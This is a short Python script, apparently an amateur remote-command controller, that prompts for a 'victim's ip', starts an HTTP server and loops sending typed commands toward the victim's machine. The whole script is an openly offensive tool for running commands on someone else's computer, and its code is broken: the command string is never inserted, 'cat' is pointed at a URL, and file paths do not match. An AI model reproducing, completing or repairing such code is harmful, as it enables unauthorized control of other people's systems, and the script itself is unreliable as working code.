import os, time, sys

print("press ctrl + c to quit")
ip = input("victim's ip: ")
os.system("python3 -m http.server 8080 2>&1 &")
while True:
	try:
		com = input("$ ")
		os.system("echo {} > data.txt")
		time.sleep(1.5)
		os.system("cat http://{}:8080/data".format(ip))
	except KeyboardInterrupt:
		sys.exit()